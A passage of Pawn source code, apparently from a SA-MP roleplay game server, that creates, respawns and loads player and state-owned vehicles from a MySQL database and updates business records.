	VehicleInfo[ i ][ vVirtualWorld ] = 0;
	VehicleInfo[ i ][ vInterior ] = 0;
	VehicleInfo[ i ][ vUsage ] = veh_usage;
	VehicleInfo[ i ][ vOrganization ] = veh_org;

	if( veh_org != -1 ) VehicleInfo[ i ][ vOrganizationSQLID ] = org_info[ veh_org ][ oID ];
	else VehicleInfo[ i ][ vOrganizationSQLID ] = 0;

	VehicleInfo[ i ][ vColor1 ] = veh_col_1;
    VehicleInfo[ i ][ vColor2 ] = veh_col_2;
    VehicleInfo[ i ][ vModel ] = veh_model;
    VehicleInfo[ i ][ vReg ] = 1;
    VehicleInfo[ i ][ vRegVreme ] = 0;
	VehicleInfo[ i ][ vTeh ] = 1;
    VehicleInfo[ i ][ vOsiguranje ] = 5;
    VehicleInfo[ i ][ v_owner_id ] = -1;

    if( veh_usage == PRIVATNO_VOZILO )
	{
    	VehicleInfo[ i ][ vLock ] = 0;
    	VehicleInfo[ i ][ vAlarm ] = 0;
    	VehicleInfo[ i ][ vImobilizator ] = 0;
	}
    else
	{
    	VehicleInfo[ i ][ vLock ] = 5;
    	VehicleInfo[ i ][ vAlarm ] = 4;
    	VehicleInfo[ i ][ vImobilizator ] = 5;
	}

	VehicleInfo[ i ][ vNeon ] = 0;
    VehicleInfo[ i ][ vTuned ] = 0;
    VehicleInfo[ i ][ vSpoiler ] = 0;
    VehicleInfo[ i ][ vHood ] = 0;
    VehicleInfo[ i ][ vRoof ] = 0;
    VehicleInfo[ i ][ vSkirt ] = 0;
    VehicleInfo[ i ][ vLamps ] = 0;
    VehicleInfo[ i ][ vNitro ] = 0;
    VehicleInfo[ i ][ vExhaust ] = 0;
    VehicleInfo[ i ][ vWheels ] = 0;
    VehicleInfo[ i ][ vStereo ] = 0;
    VehicleInfo[ i ][ vHydraulics ] = 0;
    VehicleInfo[ i ][ vFrontBumper ] = 0;
    VehicleInfo[ i ][ vRearBumper ] = 0;
    VehicleInfo[ i ][ vVents ] = 0;
    VehicleInfo[ i ][ vPaintJob ] = 255;
    VehicleInfo[ i ][ vMaterijali ] = 0;
    VehicleInfo[ i ][ vDrugAmmount ] = 0;
	VehicleInfo[ i ][ vMelee ] = 0; VehicleInfo[ i ][ vWeap1 ] = 0; VehicleInfo[ i ][ vAmmo1 ] = 0; VehicleInfo[ i ][ vWeap2 ] = 0; VehicleInfo[ i ][ vAmmo2 ] = 0;

    LinkVehicleToInterior( i, VehicleInfo[ i ][ vInterior ] );
    SetVehicleVirtualWorld( i, VehicleInfo[ i ][ vVirtualWorld ] );

	vCanDrive[ i ] = 1;
	UnLockCar( i );
	ResetVehicleStatistics( i );

    SetVehicleLabels( i );

    if( veh_usage == PRIVATNO_VOZILO ) SetVehicleNumberPlate( i, "NEMA" );
	else SetTablice( i );

	carspawntimer = 1;
	SetTimer_("AntiSpawnCrash", 3000, 3000, 1);

	SetVehicleParamsEx( i, 0, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
	if( IsVehicleBajs( i ) )
	{
		SetVehicleParamsEx( i, 1, 0, 0, VehicleInfo[ i ][ vLocked ], 0, 0, 0 );
	}

    new query[ 1024 ];
    mysql_format( mSQL, query, sizeof( query ), 
    	"INSERT INTO `vehicles` (v_price, v_pos_x, v_pos_y, v_pos_z, v_pos_a, v_virtualw, v_interior, v_usage, v_organization, v_color_1, v_color_2, v_model) \
  		VALUES( '%d', '%f', '%f', '%f', '%f', '%d', '%d', '%d', '%d', '%d', '%d', '%d' )",

	    VehicleInfo[ i ][ vPrice ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ],
		VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vVirtualWorld ], VehicleInfo[ i ][ vInterior ],
		VehicleInfo[ i ][ vUsage ], VehicleInfo[ i ][ vOrganizationSQLID ],
		VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], VehicleInfo[ i ][ vModel ] );

	mysql_tquery( mSQL, query, "OnVehicleCreate", "i", i);
    return i;
}

_:public OnVehicleCreate( vehicleid )
{
	VehicleInfo[ vehicleid ][ vSqlID ] = cache_insert_id();
	return 1;
}

_:public park_vehicleCheckID( playerid, v_vehicle_id )
{
	new v_vSqlID = VehicleInfo[ v_vehicle_id ][ vSqlID ];
    new v_vOwner_sqlID = VehicleInfo[ v_vehicle_id ][ vOwner_sqlID ];
    new v_vOwner[ 24 ];
	strmid( v_vOwner, VehicleInfo[ v_vehicle_id ][ vOwner ], 0, strlen( VehicleInfo[ v_vehicle_id ][ vOwner ] ), 24);
	new v_vPrice = VehicleInfo[ v_vehicle_id ][ vPrice ];
	new v_vLocked = VehicleInfo[ v_vehicle_id ][ vLocked ];
	new Float:v_vLokacijaX = VehicleInfo[ v_vehicle_id ][ vLokacijaX ];
	new Float:v_vLokacijaY = VehicleInfo[ v_vehicle_id ][ vLokacijaY ];
	new Float:v_vLokacijaZ = VehicleInfo[ v_vehicle_id ][ vLokacijaZ ];
	new Float:v_vLokacijaA = VehicleInfo[ v_vehicle_id ][ vLokacijaA ];
	new v_vVirtualWorld = VehicleInfo[ v_vehicle_id ][ vVirtualWorld ];
	new v_vInterior = VehicleInfo[ v_vehicle_id ][ vInterior ];
	new v_vUsage = VehicleInfo[ v_vehicle_id ][ vUsage ];
	new v_vOrganizationSQLID = VehicleInfo[ v_vehicle_id ][ vOrganizationSQLID ];
	new v_vOrganization = VehicleInfo[ v_vehicle_id ][ vOrganization ];
	new v_vColor1 = VehicleInfo[ v_vehicle_id ][ vColor1 ];
	new v_vColor2 = VehicleInfo[ v_vehicle_id ][ vColor2 ];
	new v_vModel = VehicleInfo[ v_vehicle_id ][ vModel ];
	new v_vTeh = VehicleInfo[ v_vehicle_id ][ vTeh ];
	new v_vReg = VehicleInfo[ v_vehicle_id ][ vReg ];
	new v_vRegVreme = VehicleInfo[ v_vehicle_id ][ vRegVreme ];
	new v_vTablice[ 24 ];
	strmid( v_vTablice, VehicleInfo[ v_vehicle_id ][ vTablice ], 0, strlen( VehicleInfo[ v_vehicle_id ][ vTablice ] ), 24);
	new v_vOsiguranje = VehicleInfo[ v_vehicle_id ][ vOsiguranje ];
	new v_vLock = VehicleInfo[ v_vehicle_id ][ vLock ];
	new v_vAlarm = VehicleInfo[ v_vehicle_id ][ vAlarm ];
	new v_vNeon = VehicleInfo[ v_vehicle_id ][ vNeon ];
	new v_vTuned = VehicleInfo[ v_vehicle_id ][ vTuned ];
	new v_vImobilizator = VehicleInfo[ v_vehicle_id ][ vImobilizator ];
	new v_vSpoiler = VehicleInfo[ v_vehicle_id ][ vSpoiler ];
	new v_vHood = VehicleInfo[ v_vehicle_id ][ vHood ];
	new v_vRoof = VehicleInfo[ v_vehicle_id ][ vRoof ];
    new v_vSkirt = VehicleInfo[ v_vehicle_id ][ vSkirt ];
    new v_vLamps = VehicleInfo[ v_vehicle_id ][ vLamps ];
    new v_vNitro = VehicleInfo[ v_vehicle_id ][ vNitro ];
    new v_vExhaust = VehicleInfo[ v_vehicle_id ][ vExhaust ];
    new v_vWheels = VehicleInfo[ v_vehicle_id ][ vWheels ];
    new v_vStereo = VehicleInfo[ v_vehicle_id ][ vStereo ];
    new v_vHydraulics = VehicleInfo[ v_vehicle_id ][ vHydraulics ];
    new v_vFrontBumper = VehicleInfo[ v_vehicle_id ][ vFrontBumper ];
    new v_vRearBumper = VehicleInfo[ v_vehicle_id ][ vRearBumper ];
    new v_vVents = VehicleInfo[ v_vehicle_id ][ vVents ];
    new v_vPaintJob = VehicleInfo[ v_vehicle_id ][ vPaintJob ];
    new v_vDrugAmmount1 = VehicleInfo[ v_vehicle_id ][ vDrugAmmount ];
    new v_vMaterijali = VehicleInfo[ v_vehicle_id ][ vMaterijali ];
    new v_vMelee = VehicleInfo[ v_vehicle_id ][ vMelee ];
    new v_vWeap1 = VehicleInfo[ v_vehicle_id ][ vWeap1 ];
    new v_vAmmo1 = VehicleInfo[ v_vehicle_id ][ vAmmo1 ];
    new v_vWeap2 = VehicleInfo[ v_vehicle_id ][ vWeap2 ];
    new v_vAmmo2 = VehicleInfo[ v_vehicle_id ][ vAmmo2 ];
    new v_vKilometri = VehicleInfo[ v_vehicle_id ][ vKilometri ];
	new v_vMetri = VehicleInfo[ v_vehicle_id ][ vMetri ];
	new v_v_owner_id = VehicleInfo[ v_vehicle_id ][ v_owner_id ];

    SMG_DestroyVehicle( v_vehicle_id );
	new new_veh_id = SMG_CreateVehicle( v_vModel, v_vLokacijaX, v_vLokacijaY, v_vLokacijaZ+1.0, v_vLokacijaA, v_vColor1, v_vColor2, 300000 );
	LinkVehicleToInterior( new_veh_id, v_vInterior );
    SetVehicleVirtualWorld( new_veh_id, v_vVirtualWorld );

    carspawntimer = 1;
	SetTimer_("AntiSpawnCrash", 3000, 3000, 1);

    TuneParkVehicle( new_veh_id, v_vTuned, v_vPaintJob, v_vSpoiler, v_vNitro, v_vFrontBumper, v_vRearBumper, v_vStereo, v_vExhaust, v_vLamps, v_vHydraulics, v_vVents, v_vHood, v_vWheels, v_vRoof, v_vSkirt, v_vColor1, v_vColor2 );

	SetVehicleParamsEx( new_veh_id, 0, 0, 0, v_vLocked, 0, 0, 0 );
	if( IsVehicleBajs( new_veh_id ) )
	{
		SetVehicleParamsEx( new_veh_id, 1, 0, 0, v_vLocked, 0, 0, 0 );
	}

	if( new_veh_id != v_vehicle_id )
	{
		if( playerid != -1 )
		{
			for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
		  		if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == v_vehicle_id )
	  			{
					player_veh[ playerid ][ vehicle_id ][ j ] = new_veh_id;
					break;
				}
			}
		}

		VehicleInfo[ new_veh_id ][ vSqlID ] = v_vSqlID;
	    VehicleInfo[ new_veh_id ][ vOwner_sqlID ] = v_vOwner_sqlID;
		strmid( VehicleInfo[ new_veh_id ][ vOwner ], v_vOwner, 0, strlen( v_vOwner ), 24);
		VehicleInfo[ new_veh_id ][ vPrice ] = v_vPrice;
		VehicleInfo[ new_veh_id ][ vLocked ] = v_vLocked;
		VehicleInfo[ new_veh_id ][ vLokacijaX ] = v_vLokacijaX;
		VehicleInfo[ new_veh_id ][ vLokacijaY ] = v_vLokacijaY;
		VehicleInfo[ new_veh_id ][ vLokacijaZ ] = v_vLokacijaZ;
		VehicleInfo[ new_veh_id ][ vLokacijaA ] = v_vLokacijaA;
		VehicleInfo[ new_veh_id ][ vVirtualWorld ] = v_vVirtualWorld;
		VehicleInfo[ new_veh_id ][ vInterior ] = v_vInterior;
		VehicleInfo[ new_veh_id ][ vUsage ] = v_vUsage;
		VehicleInfo[ new_veh_id ][ vOrganizationSQLID ] = v_vOrganizationSQLID;
		VehicleInfo[ new_veh_id ][ vOrganization ] = v_vOrganization;
		VehicleInfo[ new_veh_id ][ vColor1 ] = v_vColor1;
		VehicleInfo[ new_veh_id ][ vColor2 ] = v_vColor2;
		VehicleInfo[ new_veh_id ][ vModel ] = v_vModel;
		VehicleInfo[ new_veh_id ][ vTeh ] = v_vTeh;
		VehicleInfo[ new_veh_id ][ vReg ] = v_vReg;
		VehicleInfo[ new_veh_id ][ vRegVreme ] = v_vRegVreme;
		strmid( VehicleInfo[ new_veh_id ][ vTablice ], v_vTablice, 0, strlen( v_vTablice ), 24);
		VehicleInfo[ new_veh_id ][ vOsiguranje ] = v_vOsiguranje;
		VehicleInfo[ new_veh_id ][ vLock ] = v_vLock;
		VehicleInfo[ new_veh_id ][ vAlarm ] = v_vAlarm;
		VehicleInfo[ new_veh_id ][ vNeon ] = v_vNeon;
		VehicleInfo[ new_veh_id ][ vTuned ] = v_vTuned;
		VehicleInfo[ new_veh_id ][ vImobilizator ] = v_vImobilizator;
		VehicleInfo[ new_veh_id ][ vSpoiler ] = v_vSpoiler;
		VehicleInfo[ new_veh_id ][ vHood ] = v_vHood;
		VehicleInfo[ new_veh_id ][ vRoof ] = v_vRoof;
	    VehicleInfo[ new_veh_id ][ vSkirt ] = v_vSkirt;
	    VehicleInfo[ new_veh_id ][ vLamps ] = v_vLamps;
	    VehicleInfo[ new_veh_id ][ vNitro ] = v_vNitro;
	    VehicleInfo[ new_veh_id ][ vExhaust ] = v_vExhaust;
	    VehicleInfo[ new_veh_id ][ vWheels ] = v_vWheels;
	    VehicleInfo[ new_veh_id ][ vStereo ] = v_vStereo;
	    VehicleInfo[ new_veh_id ][ vHydraulics ] = v_vHydraulics;
	    VehicleInfo[ new_veh_id ][ vFrontBumper ] = v_vFrontBumper;
	    VehicleInfo[ new_veh_id ][ vRearBumper ] = v_vRearBumper;
	    VehicleInfo[ new_veh_id ][ vVents ] = v_vVents;
	    VehicleInfo[ new_veh_id ][ vPaintJob ] = v_vPaintJob;
	    VehicleInfo[ new_veh_id ][ vDrugAmmount ] = v_vDrugAmmount1;
	    VehicleInfo[ new_veh_id ][ vMaterijali ] = v_vMaterijali;
	    VehicleInfo[ new_veh_id ][ vMelee ] = v_vMelee;
	    VehicleInfo[ new_veh_id ][ vWeap1 ] = v_vWeap1;
	    VehicleInfo[ new_veh_id ][ vAmmo1 ] = v_vAmmo1;
	    VehicleInfo[ new_veh_id ][ vWeap2 ] = v_vWeap2;
	    VehicleInfo[ new_veh_id ][ vAmmo2 ] = v_vAmmo2;
	    VehicleInfo[ new_veh_id ][ vKilometri ] = v_vKilometri;
		VehicleInfo[ new_veh_id ][ vMetri ] = v_vMetri;
		VehicleInfo[ new_veh_id ][ v_owner_id ] = v_v_owner_id;

		ResetVehicle( v_vehicle_id );

		if( playerid == -1 && v_v_owner_id != -1 )
		{
		    new player_id = v_owner_id;
		    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
		  		if( (j+1) <= PlayerInfo[ player_id ][ xSlotoviVozila ] && player_veh[ player_id ][ vehicle_id ][ j ] != -1 && player_veh[ player_id ][ vehicle_id ][ j ] == v_vehicle_id )
	  			{
					player_veh[ player_id ][ vehicle_id ][ j ] = new_veh_id;
					break;
				}
			}
		}
	}
	return 1;
}

_:public OnPlayerVehiclesLoad( playerid )
{
    new rows, fields, vehicleid;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
            if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Nemoguce je trenutno kreirati vasa vozila, limit vozila na serveru je dosegnut.");

            vehicleid = SMG_CreateVehicle( cache_get_field_content_int( i, "v_model" ),
											cache_get_field_content_float( i, "v_pos_x" ),
											cache_get_field_content_float( i, "v_pos_y" ),
											cache_get_field_content_float( i, "v_pos_z" )+1.0,
											cache_get_field_content_float( i, "v_pos_a" ),
											cache_get_field_content_int( i, "v_color_1" ),
											cache_get_field_content_int( i, "v_color_2" ), 300000 );

            VehicleInfo[ vehicleid ][ vSqlID ] = cache_get_field_content_int( i, "veh_id" );
			VehicleInfo[ vehicleid ][ vOwner_sqlID ] = cache_get_field_content_int( i, "owner_sqlID" );
			strmid( VehicleInfo[ vehicleid ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);
			VehicleInfo[ vehicleid ][ vPrice ] = cache_get_field_content_int( i, "v_price" );
			VehicleInfo[ vehicleid ][ vLocked ] = cache_get_field_content_int( i, "v_locked" );
			VehicleInfo[ vehicleid ][ vLokacijaX ] = cache_get_field_content_float( i, "v_pos_x" );
			VehicleInfo[ vehicleid ][ vLokacijaY ] = cache_get_field_content_float( i, "v_pos_y" );
			VehicleInfo[ vehicleid ][ vLokacijaZ ] = cache_get_field_content_float( i, "v_pos_z" );
			VehicleInfo[ vehicleid ][ vLokacijaA ] = cache_get_field_content_float( i, "v_pos_a" );
			VehicleInfo[ vehicleid ][ vVirtualWorld ] = cache_get_field_content_int( i, "v_virtualw" );
			VehicleInfo[ vehicleid ][ vInterior ] = cache_get_field_content_int( i, "v_interior" );
			VehicleInfo[ vehicleid ][ vUsage ] = cache_get_field_content_int( i, "v_usage" );
			VehicleInfo[ vehicleid ][ vOrganizationSQLID ] = cache_get_field_content_int( i, "v_organization" );
			VehicleInfo[ vehicleid ][ vOrganization ] = -1;
			VehicleInfo[ vehicleid ][ vColor1 ] = cache_get_field_content_int( i, "v_color_1" );
			VehicleInfo[ vehicleid ][ vColor2 ]  = cache_get_field_content_int( i, "v_color_2" );
			VehicleInfo[ vehicleid ][ vModel ] = cache_get_field_content_int( i, "v_model" );
			VehicleInfo[ vehicleid ][ vTeh ] = cache_get_field_content_int( i, "v_teh" );
			VehicleInfo[ vehicleid ][ vReg ] = cache_get_field_content_int( i, "v_reg" );
			VehicleInfo[ vehicleid ][ vRegVreme ] = cache_get_field_content_int( i, "v_reg_vreme" );
			cache_get_field_content( i, "v_tablice", VehicleInfo[ vehicleid ][ vTablice ], mSQL, 16 );
			VehicleInfo[ vehicleid ][ vOsiguranje ] = cache_get_field_content_int( i, "v_insurance" );
			VehicleInfo[ vehicleid ][ vLock ] = cache_get_field_content_int( i, "v_lock" );
			VehicleInfo[ vehicleid ][ vAlarm ] = cache_get_field_content_int( i, "v_alarm" );
			VehicleInfo[ vehicleid ][ vNeon ] = cache_get_field_content_int( i, "v_neon" );
		    VehicleInfo[ vehicleid ][ vTuned ] = cache_get_field_content_int( i, "v_tuned" );
			VehicleInfo[ vehicleid ][ vImobilizator ] = cache_get_field_content_int( i, "v_imobilizator" );
			VehicleInfo[ vehicleid ][ vSpoiler ] = cache_get_field_content_int( i, "v_spoiler" );
			VehicleInfo[ vehicleid ][ vHood ] = cache_get_field_content_int( i, "v_hood" );
			VehicleInfo[ vehicleid ][ vRoof ] = cache_get_field_content_int( i, "v_roof" );
			VehicleInfo[ vehicleid ][ vSkirt ] = cache_get_field_content_int( i, "v_skirt" );
			VehicleInfo[ vehicleid ][ vLamps ] = cache_get_field_content_int( i, "v_lamps" );
			VehicleInfo[ vehicleid ][ vNitro ] = cache_get_field_content_int( i, "v_nitro" );
			VehicleInfo[ vehicleid ][ vExhaust ] = cache_get_field_content_int( i, "v_exhaust" );
			VehicleInfo[ vehicleid ][ vWheels ] = cache_get_field_content_int( i, "v_wheels" );
			VehicleInfo[ vehicleid ][ vStereo ] = cache_get_field_content_int( i, "v_stereo" );
			VehicleInfo[ vehicleid ][ vHydraulics ] = cache_get_field_content_int( i, "v_hydraulics" );
			VehicleInfo[ vehicleid ][ vFrontBumper ] = cache_get_field_content_int( i, "v_front_bumper" );
			VehicleInfo[ vehicleid ][ vRearBumper ] = cache_get_field_content_int( i, "v_rear_bumper" );
			VehicleInfo[ vehicleid ][ vVents ] = cache_get_field_content_int( i, "v_vents" );
			VehicleInfo[ vehicleid ][ vPaintJob ] = cache_get_field_content_int( i, "v_paintjob" );
			VehicleInfo[ vehicleid ][ vDrugAmmount ] = cache_get_field_content_int( i, "v_drug_ammount" );
			VehicleInfo[ vehicleid ][ vMaterijali ] = cache_get_field_content_int( i, "v_mats" );
			VehicleInfo[ vehicleid ][ vMelee ] = cache_get_field_content_int( i, "v_weapon_melee" );
			VehicleInfo[ vehicleid ][ vWeap1 ] = cache_get_field_content_int( i, "v_weapon_slot_1" );
			VehicleInfo[ vehicleid ][ vAmmo1 ] = cache_get_field_content_int( i, "v_weapon_ammo_1" );
			VehicleInfo[ vehicleid ][ vWeap2 ] = cache_get_field_content_int( i, "v_weapon_slot_2" );
			VehicleInfo[ vehicleid ][ vAmmo2 ] = cache_get_field_content_int( i, "v_weapon_ammo_2" );
			VehicleInfo[ vehicleid ][ vKilometri ] = cache_get_field_content_int( i, "v_kilometri" );
			VehicleInfo[ vehicleid ][ vMetri ] = cache_get_field_content_int( i, "v_metri" );
			VehicleInfo[ vehicleid ][ v_owner_id ] = playerid;

			LinkVehicleToInterior( vehicleid, VehicleInfo[ vehicleid ][ vInterior ] );
	        SetVehicleVirtualWorld( vehicleid, VehicleInfo[ vehicleid ][ vVirtualWorld ] );
			vCanDrive[ vehicleid ] = 1;

           	VehicleInfo[ vehicleid ][ Validv3DText ] = false;
           	DestroyDynamic3DTextLabel(VehicleInfo[ vehicleid ][ v3DText ]);

	        SetVehicleParamsEx( vehicleid, 0, 0, 0, VehicleInfo[ vehicleid ][ vLocked ], 0, 0, 0 );
	        if( IsVehicleBajs( vehicleid ) )
			{
				SetVehicleParamsEx( vehicleid, 1, 0, 0, VehicleInfo[ vehicleid ][ vLocked ], 0, 0, 0 );
			}
	        ResetVehicleStatistics( vehicleid );

			SetVehicleLabels( vehicleid );

			if( VehicleInfo[ vehicleid ][ vReg ] == 1 ) SetTablice( vehicleid );
			else if( VehicleInfo[ vehicleid ][ vReg ] == 2 ) SetVehicleNumberPlate( vehicleid, VehicleInfo[ vehicleid ][ vTablice ] );
			else SetVehicleNumberPlate( vehicleid, "NEMA" );

			TuneVehicle( vehicleid );

            for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
                if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] && player_veh[ playerid ][ vehicle_id ][ j ] == -1 )
				{
					player_veh[ playerid ][ vehicle_id ][ j ] = vehicleid;
					break;
				}
			}
		}
	}
	return 1;
}

_:public OnVehiclesLoad( playerid, targetid, moneyauc )
{
	new rows, fields, vehicleid;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
            vehicleid = SMG_CreateVehicle( cache_get_field_content_int( i, "v_model" ),
											cache_get_field_content_float( i, "v_pos_x" ),
											cache_get_field_content_float( i, "v_pos_y" ),
											cache_get_field_content_float( i, "v_pos_z" )+1.0,
											cache_get_field_content_float( i, "v_pos_a" ),
											cache_get_field_content_int( i, "v_color_1" ),
											cache_get_field_content_int( i, "v_color_2" ), 300000 );

            VehicleInfo[ vehicleid ][ vSqlID ] = cache_get_field_content_int( i, "veh_id" );
			VehicleInfo[ vehicleid ][ vOwner_sqlID ] = cache_get_field_content_int( i, "owner_sqlID" );
			strmid( VehicleInfo[ vehicleid ][ vOwner ], "Drzava", 0, strlen( "Drzava" ), 24);
			VehicleInfo[ vehicleid ][ vPrice ] = cache_get_field_content_int( i, "v_price" );
			VehicleInfo[ vehicleid ][ vLocked ] = cache_get_field_content_int( i, "v_locked" );
			VehicleInfo[ vehicleid ][ vLokacijaX ] = cache_get_field_content_float( i, "v_pos_x" );
			VehicleInfo[ vehicleid ][ vLokacijaY ] = cache_get_field_content_float( i, "v_pos_y" );
			VehicleInfo[ vehicleid ][ vLokacijaZ ] = cache_get_field_content_float( i, "v_pos_z" );
			VehicleInfo[ vehicleid ][ vLokacijaA ] = cache_get_field_content_float( i, "v_pos_a" );
			VehicleInfo[ vehicleid ][ vVirtualWorld ] = cache_get_field_content_int( i, "v_virtualw" );
			VehicleInfo[ vehicleid ][ vInterior ] = cache_get_field_content_int( i, "v_interior" );
			VehicleInfo[ vehicleid ][ vUsage ] = cache_get_field_content_int( i, "v_usage" );
			VehicleInfo[ vehicleid ][ vOrganizationSQLID ] = cache_get_field_content_int( i, "v_organization" );
			VehicleInfo[ vehicleid ][ vOrganization ] = -1;

			if( VehicleInfo[ vehicleid ][ vOrganizationSQLID ] != 0 )
			{
                for( new j = 1; j < MAX_ORG; j++)
				{
			        if( org_info[ j ][ oID ] == VehicleInfo[ vehicleid ][ vOrganizationSQLID ] )
					{
			            VehicleInfo[ vehicleid ][ vOrganization ] = j;
			            break;
			        }
			    }
			}

			VehicleInfo[ vehicleid ][ vColor1 ] = cache_get_field_content_int( i, "v_color_1" );
			VehicleInfo[ vehicleid ][ vColor2 ]  = cache_get_field_content_int( i, "v_color_2" );
			VehicleInfo[ vehicleid ][ vModel ] = cache_get_field_content_int( i, "v_model" );
			VehicleInfo[ vehicleid ][ vTeh ] = cache_get_field_content_int( i, "v_teh" );
			VehicleInfo[ vehicleid ][ vReg ] = cache_get_field_content_int( i, "v_reg" );
			VehicleInfo[ vehicleid ][ vRegVreme ] = cache_get_field_content_int( i, "v_reg_vreme" );
			cache_get_field_content( i, "v_tablice", VehicleInfo[ vehicleid ][ vTablice ], mSQL, 16 );
			VehicleInfo[ vehicleid ][ vOsiguranje ] = cache_get_field_content_int( i, "v_insurance" );
			VehicleInfo[ vehicleid ][ vLock ] = cache_get_field_content_int( i, "v_lock" );
			VehicleInfo[ vehicleid ][ vAlarm ] = cache_get_field_content_int( i, "v_alarm" );
			VehicleInfo[ vehicleid ][ vNeon ] = cache_get_field_content_int( i, "v_neon" );
		    VehicleInfo[ vehicleid ][ vTuned ] = cache_get_field_content_int( i, "v_tuned" );
			VehicleInfo[ vehicleid ][ vImobilizator ] = cache_get_field_content_int( i, "v_imobilizator" );
			VehicleInfo[ vehicleid ][ vSpoiler ] = cache_get_field_content_int( i, "v_spoiler" );
			VehicleInfo[ vehicleid ][ vHood ] = cache_get_field_content_int( i, "v_hood" );
			VehicleInfo[ vehicleid ][ vRoof ] = cache_get_field_content_int( i, "v_roof" );
			VehicleInfo[ vehicleid ][ vSkirt ] = cache_get_field_content_int( i, "v_skirt" );
			VehicleInfo[ vehicleid ][ vLamps ] = cache_get_field_content_int( i, "v_lamps" );
			VehicleInfo[ vehicleid ][ vNitro ] = cache_get_field_content_int( i, "v_nitro" );
			VehicleInfo[ vehicleid ][ vExhaust ] = cache_get_field_content_int( i, "v_exhaust" );
			VehicleInfo[ vehicleid ][ vWheels ] = cache_get_field_content_int( i, "v_wheels" );
			VehicleInfo[ vehicleid ][ vStereo ] = cache_get_field_content_int( i, "v_stereo" );
			VehicleInfo[ vehicleid ][ vHydraulics ] = cache_get_field_content_int( i, "v_hydraulics" );
			VehicleInfo[ vehicleid ][ vFrontBumper ] = cache_get_field_content_int( i, "v_front_bumper" );
			VehicleInfo[ vehicleid ][ vRearBumper ] = cache_get_field_content_int( i, "v_rear_bumper" );
			VehicleInfo[ vehicleid ][ vVents ] = cache_get_field_content_int( i, "v_vents" );
			VehicleInfo[ vehicleid ][ vPaintJob ] = cache_get_field_content_int( i, "v_paintjob" );
			VehicleInfo[ vehicleid ][ vDrugAmmount ] = cache_get_field_content_int( i, "v_drug_ammount" );
			VehicleInfo[ vehicleid ][ vMaterijali ] = cache_get_field_content_int( i, "v_mats" );
			VehicleInfo[ vehicleid ][ vMelee ] = cache_get_field_content_int( i, "v_weapon_melee" );
			VehicleInfo[ vehicleid ][ vWeap1 ] = cache_get_field_content_int( i, "v_weapon_slot_1" );
			VehicleInfo[ vehicleid ][ vAmmo1 ] = cache_get_field_content_int( i, "v_weapon_ammo_1" );
			VehicleInfo[ vehicleid ][ vWeap2 ] = cache_get_field_content_int( i, "v_weapon_slot_2" );
			VehicleInfo[ vehicleid ][ vAmmo2 ] = cache_get_field_content_int( i, "v_weapon_ammo_2" );
			VehicleInfo[ vehicleid ][ vKilometri ] = cache_get_field_content_int( i, "v_kilometri" );
			VehicleInfo[ vehicleid ][ vMetri ] = cache_get_field_content_int( i, "v_metri" );
			VehicleInfo[ vehicleid ][ v_owner_id ] = -1;

			LinkVehicleToInterior( vehicleid, VehicleInfo[ vehicleid ][ vInterior ] );
	        SetVehicleVirtualWorld( vehicleid, VehicleInfo[ vehicleid ][ vVirtualWorld ] );
			vCanDrive[ vehicleid ] = 1;

           	VehicleInfo[ vehicleid ][ Validv3DText ] = false;
           	DestroyDynamic3DTextLabel(VehicleInfo[ vehicleid ][ v3DText ]);

	        SetVehicleParamsEx( vehicleid, 0, 0, 0, VehicleInfo[ vehicleid ][ vLocked ], 0, 0, 0 );
	        if( IsVehicleBajs( vehicleid ) )
			{
				SetVehicleParamsEx( vehicleid, 1, 0, 0, VehicleInfo[ vehicleid ][ vLocked ], 0, 0, 0 );
			}
	        ResetVehicleStatistics( vehicleid );

			SetVehicleLabels( vehicleid );

			if( VehicleInfo[ vehicleid ][ vReg ] == 1 ) SetTablice( vehicleid );
			else if( VehicleInfo[ vehicleid ][ vReg ] == 2 ) SetVehicleNumberPlate( vehicleid, VehicleInfo[ vehicleid ][ vTablice ] );
			else SetVehicleNumberPlate( vehicleid, "NEMA" );

			TuneVehicle( vehicleid );
		}
	}
	else
	{
		if( playerid != 1001 ) SendInfoMessage( playerid, "Pogresan basesqlID(nepostoji)." );
	}
	printf("(U) SQL: Ucitao - Vozila(%d)", rows);
	return 1;
}

_:public sql_bussines_update_integer( bussinesID, field[], value )
{
	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `%s` = '%d' WHERE `bussines_id` = '%d'", field, value, BusinessInfo[ bussinesID ][ b_ID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_bussines_update_string( bussinesID, field[], val[])
{
	new q[ 128 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `%s` = '%e' WHERE `bussines_id` = '%d'", field, val, BusinessInfo[ bussinesID ][ b_ID ] );
    mysql_tquery( mSQL, q);
	return 1;
}

_:public sql_create_bussines( bussinesID )
{
	new query[ 1024 ];
    mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `bussines` (b_owner_sqlID, bOnAuction, bOwner, b_price, b_type, b_locked, b_money, b_enter_x, b_enter_y, b_enter_z, \
					 b_exit_x, b_exit_y, b_exit_z, b_enter_int, b_enter_vw, b_exit_int, b_exit_vw, b_name, b_level)" );
    mysql_format( mSQL, query, sizeof( query ),	"%s VALUES( '%d', '0', 'Drzava', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%d', '%d', '%e', '%d' )",
